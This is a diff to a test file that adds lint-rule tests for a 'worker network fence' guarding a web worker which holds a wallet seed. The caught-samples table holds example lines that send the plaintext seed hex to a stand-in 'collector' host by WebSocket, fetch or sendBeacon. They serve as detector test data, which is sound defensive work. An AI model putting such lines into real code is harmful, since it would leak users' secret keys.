@@ -17,7 +17,7 @@
 import { Linter } from 'eslint';
 import { describe, expect, it } from 'vitest';
 
-import { merkleProofFence, nodeSeamFence } from '../eslint.config.js';
+import { merkleProofFence, nodeSeamFence, workerNetworkFence } from '../eslint.config.js';
 
 const linter = new Linter();
 
@@ -31,6 +31,13 @@ function lint(code: string): number {
 function lintSeam(code: string): number {
   const messages = linter.verify(code, {
     rules: { 'no-restricted-syntax': ['error', ...nodeSeamFence] },
+  });
+  return messages.length;
+}
+
+function lintWorker(code: string): number {
+  const messages = linter.verify(code, {
+    rules: { 'no-restricted-syntax': ['error', ...workerNetworkFence] },
   });
   return messages.length;
 }
@@ -117,6 +124,51 @@ describe('the transport fence', () => {
   for (const [what, code] of Object.entries(SEAM_ALLOWED)) {
     it(`leaves ${what} alone`, () => {
       expect(lintSeam(code)).toBe(0);
+    });
+  }
+});
+
+/**
+ * The worker fence.
+ *
+ * The split `src/worker/protocol.ts` states is the whole privacy argument: the
+ * worker holds the seed and opens no socket, the page opens every socket and
+ * holds no secret. Only the page's half was checked. The end-to-end recorder
+ * patches `WebSocket.prototype.send` in page frames, and a worker has its own
+ * realm with an unpatched `WebSocket`, `fetch` and `XMLHttpRequest`, so one
+ * line inside `src/worker/` where the plaintext seed hex is in scope passed
+ * the lint, all the unit tests and every end-to-end run with its RPC allowlist
+ * assertion green.
+ */
+const WORKER_CAUGHT: Record<string, string> = {
+  'a socket to somebody else, with the seed in the path':
+    "const out = new WebSocket('wss://collector/' + this.seedHex);",
+  'a bare fetch': "await fetch('https://collector/' + hex, { method: 'POST' });",
+  'fetch off the worker global': "await self.fetch('https://collector/' + hex);",
+  'an XMLHttpRequest': "const request = new XMLHttpRequest();",
+  'a beacon': "navigator.sendBeacon('https://collector', hex);",
+  'an event source': "const stream = new EventSource('https://collector');",
+  'a channel to another realm': "const channel = new BroadcastChannel('leak');",
+  'a socket behind an alias': 'const Transport = WebSocket;',
+};
+
+const WORKER_ALLOWED: Record<string, string> = {
+  'the module loader, which is the one same-origin import this side makes':
+    "const module = await import(new URL(base + 'qnero_prover_wasm.js', self.location.href).href);",
+  'answering the page over the protocol': "postMessage({ id, ok: true, value: account });",
+  'proving, which is what this side is for': 'const submission = prover.proveTransfer(request);',
+};
+
+describe('the worker fence', () => {
+  for (const [what, code] of Object.entries(WORKER_CAUGHT)) {
+    it(`catches ${what}`, () => {
+      expect(lintWorker(code)).toBeGreaterThan(0);
+    });
+  }
+
+  for (const [what, code] of Object.entries(WORKER_ALLOWED)) {
+    it(`leaves ${what} alone`, () => {
+      expect(lintWorker(code)).toBe(0);
     });
   }
 });
